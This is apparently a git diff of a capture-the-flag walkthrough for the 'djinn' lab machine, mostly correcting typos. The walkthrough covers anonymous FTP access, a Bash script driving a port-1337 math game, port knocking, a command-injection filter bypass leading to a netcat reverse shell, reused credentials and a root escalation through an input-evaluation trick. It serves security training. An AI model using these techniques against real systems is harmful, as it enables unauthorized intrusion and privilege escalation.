@@ -6,7 +6,11 @@
   <br>
 </h1>
 
-<h4 align="center">By <a href="https://twitter.com/0xmzfr">0xmzfr</a></h4>
+<h4 align="center">
+  CTF By <a href="https://twitter.com/0xmzfr">0xmzfr</a>
+<br>
+  Walkthrough By <a href="https://n0khodsia.github.io/">n0khodsia</a>
+</h4>
 
 ***
 
@@ -52,13 +56,13 @@ Let's try and connect to the FTP server with anonymous account (and no password)
 
 It works, and we have 3 different files `message.txt`, `gamee.txt` & `creds.txt`
 ```bash
-root@kali:~# cat message.txt 
-@nitish81299 I am going on holidays for few days, please take care of all the work. 
+root@kali:~# cat message.txt
+@nitish81299 I am going on holidays for few days, please take care of all the work.
 And don't mess up anything.
-root@kali:~# cat game.txt 
-oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
+root@kali:~# cat game.txt
+oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the
 final level and get the prize.
-root@kali:~# cat creds.txt 
+root@kali:~# cat creds.txt
 nitu:81299
 ```
 
@@ -67,7 +71,7 @@ Trying to connect to port 1337 with Netcat, gives us the following message:
 ```bash
 root@kali:~# nc ctf 1337
   ____                        _____ _                
- / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
 | |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
 | |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
  \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
@@ -80,7 +84,7 @@ Answer my questions 1000 times and I'll give you your gift.
 Wrong answer
 root@kali:~# nc ctf 1337
   ____                        _____ _                
- / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
 | |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
 | |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
  \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
@@ -91,45 +95,45 @@ Answer my questions 1000 times and I'll give you your gift.
 (3, '/', 3)
 > 1
 (5, '/', 9)
-> 
+>
 
 ```
 This little game will only accept the correct answer to the mathematical equation,
 and will provide us with another one if we answer correctly.
 
-I have written a script in Bash that recieves the equation,
+I have written a script in Bash that receives the equation,
 strips all the unnecessary characters, solves it and sends it back to the program:
 
 ```bash
 
 exec 3<>/dev/tcp/ctf/1337                                             #start the connection
-prob1=$(head -10 <&3 | awk '/^Answer/ {getline; print}')              #grep the line below 'answer' 
+prob1=$(head -10 <&3 | awk '/^Answer/ {getline; print}')              #grep the line below 'answer'
 prob2=$(echo $prob1 | sed 's|[()'\'',]||g')                           #strip chars from equation
 let a="$prob2"                                                        #solve the equation
 echo $a >&3                                                           #send the solution back
 
 count=1                                                               #counter for loop
-for i in {1..1000}                                                    #repeeat loop 1000 times
+for i in {1..1000}                                                    #repeat loop 1000 times
 do
-cycle1=$(head -1 <&3)                                                 #recieve the next equation
+cycle1=$(head -1 <&3)                                                 #receive the next equation
 cycle2=$(echo $cycle1 | sed 's|[()'\'',]||g')                         #strip chars from equation
 let b="$cycle2"                                                       #solve the equation
-echo "$count # Query recieved: $cycle1 - Math is: $cycle2 = $b"       #verbosity
+echo "$count # Query received: $cycle1 - Math is: $cycle2 = $b"       #verbosity
 echo $b >&3                                                           #send the solution back
 count=$(expr $count + 1)                                              #add +1 to the loop count
 done
 
-head -100 <&3                                                         #after 1000 repeats, show the 
+head -100 <&3                                                         #after 1000 repeats, show the
                                                                       #first 100 rows of the programs output
 ```
 
-After executing my script, i recieved the 'gift':
+After executing my script, I received the 'gift':
 ```bash
-996 # Query recieved: (9, '-', 3) - Math is: 9 - 3 = 6
-997 # Query recieved: (8, '*', 4) - Math is: 8 * 4 = 32
-998 # Query recieved: (8, '/', 9) - Math is: 8 / 9 = 0
-999 # Query recieved: (9, '+', 1) - Math is: 9 + 1 = 10
-1000 # Query recieved: (9, '+', 3) - Math is: 9 + 3 = 12
+996 # Query received: (9, '-', 3) - Math is: 9 - 3 = 6
+997 # Query received: (8, '*', 4) - Math is: 8 * 4 = 32
+998 # Query received: (8, '/', 9) - Math is: 8 / 9 = 0
+999 # Query received: (9, '+', 1) - Math is: 9 + 1 = 10
+1000 # Query received: (9, '+', 3) - Math is: 9 + 3 = 12
 Here is your gift, I hope you know what to do with it:
 
 1356, 6784, 3409
@@ -138,7 +142,7 @@ Here is your gift, I hope you know what to do with it:
 This combination of numbers had me confused at first, until I realised it's a **port knocking sequence**!
 
 ## Port Knocking
-So I tried port knocking with the sequence we recieved: 
+So I tried port knocking with the sequence we received:
 ```bash
 root@kali:~# knock -v ctf 1356, 6784, 3409
 hitting tcp 192.168.1.102:1356
@@ -162,7 +166,7 @@ MAC Address: 00:0C:29:3D:F0:FA (VMware)
 ```
 
 SSH is no longer filtered.
-I tried every possible combination with the info we got from our 3 FTP files, but no success.
+I tried every possible combination with the info we got from our 3 FTP files, but had no success.
 So, I moved on to the HTTP service.
 
 ## HTTP
@@ -208,7 +212,7 @@ From this I understand that if we add `"/home/nitish/.dev/creds.txt"` to our com
 and don't have `cat` command, we will be able to bypass the character block we encountered earlier,
 and establish a reverse shell.
 
-First of all we must listen for incoming connections:
+First of all, we must listen for incoming connections:
 ```bash
 nc -nlvp 7777
 ```
@@ -253,12 +257,12 @@ nitish:p4ssw0rdStr3r0n9
 
 Looks like SSH credentials to me. Shall we give it a try? ;)
 
-## Privillege Escalation
+## Privilege Escalation
 Trying to login to SSH with the credentials above was successful, and we got the user flag:
 ```bash
 nitish@djinn:~$ ls
 user.txt
-nitish@djinn:~$ cat user.txt 
+nitish@djinn:~$ cat user.txt
 10aay8289ptgguy1pvfa73alzusyyx3c
 ```
 
@@ -328,17 +332,17 @@ Enter your choice:
 ```
 
 This one took the most time for me to crack.
-Choosing two give us:
+Choosing two gives us:
 ```bash
-Choose a number between 1 to 100: 
-Enter your number: 
+Choose a number between 1 to 100:
+Enter your number:
 ```
 After messing around and trying endless things, i have tried entering 'num' in order to confuse the program and create
 a situation where "num = num".
-In my surprise, it actually worked!
+To my surprise, it actually worked!
 
 ```bash
-Choose a number between 1 to 100: 
+Choose a number between 1 to 100:
 Enter your number: num
 # id
 uid=0(root) gid=0(root) groups=0(root)
@@ -348,7 +352,7 @@ lago  proof.sh
 We gained root access! let's try and run `proof.sh`:
 
 ```bash
-    _                        _             _ _ _ 
+    _                        _             _ _ _
    / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
   / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
  / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
@@ -370,3 +374,7 @@ Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
 
 ## This was a fun challenge, covering various aspects of cybersecurity.
 ## Thank you so much @0xmzfr for this amazing CTF!
+
+
+
+<p align="center">Written by n0khodsia</p>
